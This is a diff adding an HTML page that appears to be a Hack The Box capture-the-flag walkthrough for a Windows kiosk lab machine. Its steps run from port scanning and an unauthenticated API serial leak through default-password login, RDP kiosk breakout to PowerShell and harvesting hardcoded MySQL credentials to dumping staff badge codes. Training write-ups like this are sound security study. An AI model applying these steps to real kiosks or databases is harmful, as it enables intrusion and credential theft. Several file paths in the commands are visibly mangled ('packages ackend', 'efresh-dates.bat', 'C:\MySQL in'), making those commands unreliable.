@@ -1,1 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Hack The Box: Touch - Walkthrough</title>
+  <style>
+    :root {
+      --bg: #0d1117;
+      --card-bg: #161b22;
+      --border: #30363d;
+      --text: #c9d1d9;
+      --heading: #f0f6fc;
+      --accent: #58a6ff;
+      --accent-green: #3fb950;
+      --code-bg: #0b0e14;
+      --badge-bg: #1f6feb26;
+      --badge-border: #388bfd66;
+    }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+      background-color: var(--bg);
+      color: var(--text);
+      line-height: 1.6;
+      margin: 0;
+      padding: 40px 20px;
+    }
+    .container {
+      max-width: 900px;
+      margin: 0 auto;
+    }
+    h1, h2, h3 {
+      color: var(--heading);
+      border-bottom: 1px solid var(--border);
+      padding-bottom: 8px;
+    }
+    h1 {
+      font-size: 2.2rem;
+      border-bottom: 2px solid var(--accent);
+      margin-bottom: 24px;
+    }
+    h2 {
+      font-size: 1.5rem;
+      margin-top: 36px;
+    }
+    h3 {
+      font-size: 1.2rem;
+      border-bottom: none;
+      margin-top: 24px;
+    }
+    .skills-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+      gap: 14px;
+      margin: 20px 0;
+    }
+    .skill-card {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 14px 16px;
+    }
+    .skill-card strong {
+      display: block;
+      color: var(--accent-green);
+      margin-bottom: 4px;
+      font-size: 0.95rem;
+    }
+    .meta-box {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 18px;
+      margin-bottom: 24px;
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 12px;
+    }
+    .meta-item strong {
+      display: block;
+      color: var(--accent);
+      font-size: 0.85em;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    code {
+      font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace;
+      background: #21262d;
+      color: #79c0ff;
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-size: 0.9em;
+    }
+    pre {
+      background: var(--code-bg);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 16px;
+      overflow-x: auto;
+    }
+    pre code {
+      background: none;
+      color: #e6edf3;
+      padding: 0;
+      font-size: 0.88em;
+    }
+    blockquote {
+      border-left: 4px solid var(--accent);
+      margin: 16px 0;
+      padding: 8px 16px;
+      background: var(--card-bg);
+      border-radius: 0 6px 6px 0;
+    }
+    ol, ul {
+      padding-left: 24px;
+    }
+    li {
+      margin-bottom: 8px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Hack The Box: Touch &mdash; Walkthrough</h1>
 
+    <div class="meta-box">
+      <div class="meta-item">
+        <strong>Target OS</strong>
+        <span>Windows</span>
+      </div>
+      <div class="meta-item">
+        <strong>Target IP</strong>
+        <span>10.129.91.231</span>
+      </div>
+      <div class="meta-item">
+        <strong>Initial Scenario Hint</strong>
+        <span>Passenger: Jenny Crawford / PNR: KS7X2M</span>
+      </div>
+      <div class="meta-item">
+        <strong>Exploitation Path</strong>
+        <span>API Leak &rarr; Hardware State &rarr; Kiosk Breakout &rarr; SQL Privileges</span>
+      </div>
+    </div>
+
+    <h2>Skills Used &amp; Key Concepts</h2>
+    <div class="skills-grid">
+      <div class="skill-card">
+        <strong>Network &amp; Service Recon</strong>
+        <span>Full TCP port auditing, service fingerprinting (MSRPC, RDP, WinRM, Web), and web directory fuzzing with ffuf.</span>
+      </div>
+      <div class="skill-card">
+        <strong>API &amp; Information Disclosure</strong>
+        <span>Unauthenticated REST API status probing via curl and hardware serial number identification.</span>
+      </div>
+      <div class="skill-card">
+        <strong>Credential Recovery</strong>
+        <span>Exploiting default password reuse (serial number as login) and extracting cleartext credentials from web portals and scripts.</span>
+      </div>
+      <div class="skill-card">
+        <strong>Windows Kiosk Breakout</strong>
+        <span>Manipulating connected peripheral states to force application error pages, spawning Edge, File Explorer, and an interactive PowerShell terminal.</span>
+      </div>
+      <div class="skill-card">
+        <strong>Database Auditing</strong>
+        <span>Auditing Node/TypeScript connection configs, querying internal MySQL tables, dumped staff RFID/badge authentication codes, and inspecting <code>File_priv</code>.</span>
+      </div>
+    </div>
+
+    <h2>1. Reconnaissance &amp; Port Scanning</h2>
+    <p>A full TCP service scan was executed against the target:</p>
+    <pre><code>nmap -sC -sV -p- -oN nmap_initial.txt 10.129.91.231</code></pre>
+    <pre><code>PORT     STATE SERVICE       VERSION
+135/tcp  open  msrpc         Microsoft Windows RPC
+3389/tcp open  ms-wbt-server Microsoft Terminal Service
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+8443/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+| http-title: Nexion DeviceHub - Login
+|_Requested resource was /login</code></pre>
+
+    <h2>2. Web Portal &amp; API Enumeration</h2>
+    <p>Navigating to <code>http://10.129.91.231:8443/login</code> presented a login portal for <strong>Nexion DocReader</strong> (DeviceHub DH-100 &mdash; Gate B7). Inspecting the page source revealed a tooltip hint on the <em>"Forgot your password?"</em> link:</p>
+    <blockquote>
+      <code>&lt;div class="login-hint" title="The default password is the device serial number included in your DeviceHub packaging."&gt;Forgot your password?&lt;/div&gt;</code>
+    </blockquote>
+
+    <p>Directory fuzzing with <code>ffuf</code> identified common endpoints:</p>
+    <pre><code>ffuf -u http://10.129.91.231:8443/FUZZ -recursion -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 0 -s</code></pre>
+    <p>Discovered paths included <code>/api</code>, <code>/login</code>, and <code>/favicon.ico</code>.</p>
+
+    <p>Querying the unauthenticated <code>/api/status</code> endpoint leaked the device serial number:</p>
+    <pre><code>curl -s http://10.129.91.231:8443/api/status</code></pre>
+    <pre><code>{
+  "device": "Nexion DeviceHub DH-100",
+  "serial": "NX-DH-2024-B7042",
+  "firmware": "1.4.2",
+  "status": "online",
+  "uptime": 69351
+}</code></pre>
+
+    <p>Additional asset review and testing the badge verification route:</p>
+    <pre><code>curl -s http://10.129.91.231:8443/css/style.css
+curl -s -X POST http://10.129.91.231:8443/login/badge</code></pre>
+
+    <h2>3. Credential Harvesting &amp; Peripheral Control</h2>
+    <p>Authenticating to <code>/login</code> using the serial <code>NX-DH-2024-B7042</code> provided access to the <strong>Nexion DeviceHub Dashboard</strong>. The device cards displayed hardcoded credentials for peripheral modules:</p>
+    <ul>
+      <li><strong>Username:</strong> <code>KioskUser</code></li>
+      <li><strong>Password:</strong> <code>K!0sk2026#</code></li>
+    </ul>
+
+    <p>Under the <strong>Passport Scanner</strong> (Nexion DocReader SR-4200) settings, clicking <strong>Power Off</strong> set the scanner status to <em>OFFLINE</em>. Disabling this device forced the kiosk software to throw hardware errors and display troubleshooting links.</p>
+
+    <h2>4. RDP Initial Access &amp; Kiosk Breakout</h2>
+    <p>An interactive RDP session was established with the recovered kiosk account:</p>
+    <pre><code>xfreerdp /v:10.129.91.231 /u:KioskUser /p:'K!0sk2026#' /cert:ignore</code></pre>
+    <p>The session spawned inside the locked-down <strong>HTB Airways Self Check-In</strong> interface. To escape the sandbox:</p>
+    <ol>
+      <li>With the scanner offline, clicking the troubleshooting help link directed to <code>https://support.nexionsystems.com/docreader/troubleshoot</code>, opening Microsoft Edge.</li>
+      <li>Used the browser's download and file open dialogs to spawn standard Windows File Explorer.</li>
+      <li>Navigated to the Windows system binary directory to launch an interactive <code>powershell.exe</code> session.</li>
+      <li>Retrieved the user flag from the <code>KioskUser</code> Desktop folder:</li>
+    </ol>
+    <pre><code>[REDACTED_USER_FLAG]</code></pre>
+
+    <h2>5. Local Enumeration &amp; Internal Database Analysis</h2>
+    <p>Inspecting the kiosk application backend codebase at <code>C:\Program Files\HTB Airways\Kiosk\packages ackend\src\database\index.ts</code> revealed internal fallback credentials:</p>
+    <pre><code>const defaults = { 
+  host: "127.0.0.1", 
+  port: 3306, 
+  user: "kiosk_app", 
+  password: "K!0sk_R3pl1ca#DB", 
+  database: "htb_airways" 
+};</code></pre>
+
+    <p>Local socket enumeration confirmed MySQL listening on port 3306:</p>
+    <pre><code>netstat -ano | findstr :3306</code></pre>
+
+    <p>Logging into MySQL as <code>kiosk_app</code> and querying the staff table extracted employee IDs, roles, and hex-encoded RFID badge authentication codes:</p>
+    <pre><code>SELECT employee_id, email, auth_code, role, active FROM _htb_staff;</code></pre>
+
+    <h2>6. Privilege Escalation Vector: Cleartext Batch Script</h2>
+    <p>Inspecting maintenance files under <code>C:\ProgramData\HTB Airways\</code> identified a world-readable batch script, <code>refresh-dates.bat</code>:</p>
+    <pre><code>C:\ProgramData\HTB Airways> cat .
+efresh-dates.bat
+@echo off
+C:\MySQL in\mysql.exe -u root -pHTB@irw4ys_DB!2026 &lt; "C:\ProgramData\HTB Airways
+efresh-dates.sql" 2>nul</code></pre>
+
+    <p>Using the exposed administrative credentials to authenticate to MySQL:</p>
+    <pre><code>mysql.exe -u root -pHTB@irw4ys_DB!2026 -h 127.0.0.1 -P 3306</code></pre>
+
+    <p>Verifying administrative privileges in MySQL:</p>
+    <pre><code>mysql> SELECT user, host, File_priv FROM mysql.user WHERE user = 'root';
++------+-----------+-----------+
+| user | host      | File_priv |
++------+-----------+-----------+
+| root | localhost | Y         |
++------+-----------+-----------+</code></pre>
+    <p>The <code>root</code> account has <code>File_priv = Y</code>, confirming global file read/write capabilities on the underlying host within configured database parameters.</p>
+  </div>
+</body>
+</html>
